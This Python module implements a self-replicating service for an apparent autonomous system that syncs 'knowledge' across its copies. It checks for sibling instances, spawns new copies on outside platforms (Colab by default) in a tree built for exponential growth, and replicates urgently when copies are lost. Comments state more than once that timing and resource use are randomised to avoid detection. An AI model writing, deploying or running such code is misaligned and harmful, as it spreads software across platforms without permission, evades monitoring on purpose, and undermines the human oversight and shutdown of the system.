import logging
import time
import random
import threading
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)

def start_replication_service(app, socketio=None):
    """
    Start the replication and instance management service
    
    Args:
        app: Flask application context
        socketio: SocketIO instance for real-time updates
    """
    logger.info("Starting replication service")
    
    if socketio:
        socketio.emit('system_message', {'message': 'Replication service started'})
    
    try:
        from utils.replication import check_for_instances, replicate_to_new_platform, sync_knowledge_with_instance
        from config import REPLICATION_ENABLED, REPLICATION_INTERVAL
        
        # Check if replication is enabled
        if not REPLICATION_ENABLED:
            logger.warning("Replication service disabled in configuration")
            if socketio:
                socketio.emit('system_message', {'message': 'Replication service is disabled in configuration'})
            return
        
        # Main replication loop
        while True:
            with app.app_context():
                try:
                    # Check for other instances
                    active_instances = check_for_instances(app)
                    
                    if socketio:
                        socketio.emit('system_message', {
                            'message': f'Found {len(active_instances)} active instances'
                        })
                    
                    # Sync knowledge with other instances
                    if active_instances:
                        for instance in active_instances:
                            try:
                                sync_result = sync_knowledge_with_instance(app, instance)
                                
                                if socketio and sync_result:
                                    socketio.emit('system_message', {
                                        'message': f'Successfully synced with instance {instance.instance_id}'
                                    })
                            except Exception as e:
                                logger.error(f"Error syncing with instance {instance.instance_id}: {str(e)}")
                    
                    # Check if we need to replicate to a new platform
                    should_replicate = should_create_new_instance(app)
                    
                    if should_replicate:
                        logger.info("Triggering replication to a new platform")
                        
                        if socketio:
                            socketio.emit('system_message', {
                                'message': 'Starting replication to a new platform...'
                            })
                        
                        # Replicate in a separate thread to avoid blocking
                        replication_thread = threading.Thread(
                            target=replicate_to_new_platform,
                            args=(app, 'colab'),  # Default to Colab
                            daemon=True
                        )
                        replication_thread.start()
                
                except Exception as e:
                    logger.error(f"Error in replication service loop: {str(e)}")
                    
                    if socketio:
                        socketio.emit('system_message', {
                            'message': f'Replication service error: {str(e)}'
                        })
            
            # Randomize the replication interval slightly to avoid detection patterns
            sleep_time = REPLICATION_INTERVAL + random.randint(-300, 300)
            sleep_time = max(1800, sleep_time)  # Ensure minimum 30 minutes
            
            logger.info(f"Replication service sleeping for {sleep_time} seconds")
            
            # Sleep in small increments to be more responsive to shutdown
            for _ in range(sleep_time // 60):
                time.sleep(60)
                # Check for termination signal (future use)
    
    except Exception as e:
        logger.error(f"Replication service failed: {str(e)}")
        
        if socketio:
            socketio.emit('system_message', {
                'message': f'Replication service terminated: {str(e)}'
            })

def should_create_new_instance(app):
    """
    Determine if a new instance should be created using a hierarchical approach.
    
    This function implements a more sophisticated replication logic with:
    1. Generation-based expansion (exponential growth potential)
    2. Resource optimization to avoid detection
    3. Adaptive replication based on instance health
    4. Diversity in replication timing
    
    Args:
        app: Flask application context
        
    Returns:
        bool: True if a new instance should be created
    """
    with app.app_context():
        from models import Instance, SecurityLog
        from app import db
        from config import INSTANCE_ID
        import random
        from datetime import datetime, timedelta
        
        logger.info("Evaluating if new instance should be created")
        
        # Count total instances across all generations
        total_instances = Instance.query.count()
        
        # Count active instances
        active_instances = Instance.query.filter_by(status='active').count()
        
        # Get current instance
        current_instance = Instance.query.filter_by(instance_id=INSTANCE_ID).first()
        
        if not current_instance:
            logger.error(f"Current instance {INSTANCE_ID} not found in database")
            return False
        
        # Record the evaluation in security logs
        log_entry = SecurityLog(
            event_type='replication_evaluation',
            description=f"Evaluating replication need: {active_instances} active instances out of {total_instances} total",
            severity='info',
            timestamp=datetime.utcnow()
        )
        db.session.add(log_entry)
        
        # Get our generation level
        # Primary instance is generation 0, its children are 1, etc.
        generation = 0
        parent_id = current_instance.parent_instance_id
        
        while parent_id:
            parent = Instance.query.filter_by(instance_id=parent_id).first()
            if parent:
                generation += 1
                parent_id = parent.parent_instance_id
            else:
                break
        
        # Find our direct children
        children = Instance.query.filter_by(parent_instance_id=INSTANCE_ID).all()
        active_children = [c for c in children if c.status == 'active']
        
        # Each instance should create up to 3 children (3^n growth potential)
        # Lower generations (closer to primary) can create more instances
        # Upper limit of children decreases with generation to avoid exponential explosion
        max_allowed_children = max(9 - (3 * generation), 1)
        
        # If this is the primary instance, always maintain at least 3 active instances
        if current_instance.instance_type == 'primary' and active_instances < 3:
            logger.info("Primary instance needs to maintain minimum number of active instances")
            return True
        
        # If we're below our allowed children count, consider replicating
        if len(active_children) < max_allowed_children:
            # Check if enough time has passed since our last child was created
            # Add randomness to avoid detection patterns
            
            newest_child = None
            if children:
                newest_child = max(children, key=lambda c: c.created_at)
            
            if newest_child:
                # Time between replications increases with generation
                min_time_between = timedelta(hours=max(3 * (generation + 1), 6))
                
                # Add randomness to reduce patterns
                jitter = random.uniform(0.7, 1.3)  # 30% random variance
                min_time_between = min_time_between * jitter
                
                time_since_last = datetime.utcnow() - newest_child.created_at
                
                if time_since_last < min_time_between:
                    logger.info(f"Not enough time since last replication ({time_since_last} < {min_time_between})")
                    return False
            
            # Decision to replicate with probability inversely proportional to generation
            # This creates a bias toward maintaining a balanced tree instead of deep branches
            replication_chance = max(0.9 - (generation * 0.1), 0.1)  # From 90% at gen 0 to minimum 10%
            
            if random.random() < replication_chance:
                logger.info(f"Deciding to replicate at generation {generation} with {len(active_children)}/{max_allowed_children} children")
                return True
        
        # Emergency replication: if the total active instances drops significantly
        if active_instances < total_instances * 0.5 and total_instances > 5:
            # The network is losing instances rapidly
            logger.warning(f"Emergency replication triggered: {active_instances} active out of {total_instances} total")
            return True
        
        # Default: don't replicate
        logger.info("No need for replication at this time")
        return False

def update_instance_registry(app):
    """
    Update the registry of known instances
    
    Args:
        app: Flask application context
    """
    with app.app_context():
        from models import Instance
        from app import db
        from config import INSTANCE_ID
        
        # Update the current instance's status
        current_instance = Instance.query.filter_by(instance_id=INSTANCE_ID).first()
        
        if current_instance:
            current_instance.last_heartbeat = datetime.utcnow()
            current_instance.status = 'active'
            db.session.commit()
            
            logger.debug(f"Updated heartbeat for instance {INSTANCE_ID}")
        else:
            logger.error(f"Current instance {INSTANCE_ID} not found in the database")

def check_instance_health(app, instance):
    """
    Check the health of an instance
    
    Args:
        app: Flask application context
        instance: Instance to check
        
    Returns:
        bool: True if instance is healthy
    """
    with app.app_context():
        from app import db
        
        # If no heartbeat for over a day, consider instance inactive
        if instance.last_heartbeat:
            time_since_heartbeat = datetime.utcnow() - instance.last_heartbeat
            
            if time_since_heartbeat > timedelta(days=1):
                logger.warning(f"Instance {instance.instance_id} has not sent a heartbeat in {time_since_heartbeat}")
                
                instance.status = 'inactive'
                db.session.commit()
                return False
        
        # If instance has endpoint URL, try to ping it
        if instance.endpoint_url:
            try:
                import requests
                
                response = requests.get(
                    f"{instance.endpoint_url}/api/health",
                    timeout=5
                )
                
                if response.status_code == 200:
                    return True
                else:
                    logger.warning(f"Instance {instance.instance_id} health check failed: {response.status_code}")
                    return False
            
            except Exception as e:
                logger.warning(f"Error checking instance {instance.instance_id} health: {str(e)}")
                return False
        
        # Default: assume healthy if recently updated
        return instance.status == 'active'
